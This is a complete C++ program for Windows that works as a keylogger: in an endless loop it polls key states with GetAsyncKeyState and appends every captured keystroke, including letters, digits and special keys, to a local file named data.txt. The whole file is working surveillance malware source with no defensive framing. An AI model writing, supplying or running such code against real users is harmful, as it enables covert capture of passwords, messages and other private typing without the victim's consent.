#include <iostream>
#include <fstream> //for working with files
#include <string>
#include <windows.h>
using namespace std;

void log(const string &text) {
    ofstream data("data.txt", ios::app);
    if (data.is_open()) {
        data << text;
    }else {
        cout << "failed to open file" << endl;
    }
}

string keyToString(int key) {
    if (key >= 'A' && key <= 'Z') {
        return string(1, char(key));
    }
    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DEL]";
        default:
            if (key >= '0' && key <= '9') {
                return string(1, char(key));
            } else {
                return "[" + to_string(key) + "]";
            }
    }
}

int main() {
    while (true) {
        for (int key = 8; key<=190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                string keySTR = keyToString(key);
                if(!keySTR.empty()) {
                    log(keySTR);
                }
            }
        }
    }

    return 0;
}